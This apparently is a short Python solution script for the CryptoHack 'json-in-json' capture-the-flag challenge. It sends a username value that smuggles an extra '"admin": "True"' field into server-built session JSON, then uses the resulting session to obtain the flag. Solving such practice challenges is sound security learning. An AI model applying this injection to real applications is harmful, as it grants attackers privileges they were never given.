from requests import get

from utils.utils import get_flag_in_message

inject = '1", "admin": "True'

res = get(rf"https://web.cryptohack.org/json-in-json/create_session/{inject}")
exploit = res.json()["session"]

res = get(rf"https://web.cryptohack.org/json-in-json/authorise/{exploit}")
flag = res.json()["response"]

print(get_flag_in_message(flag))
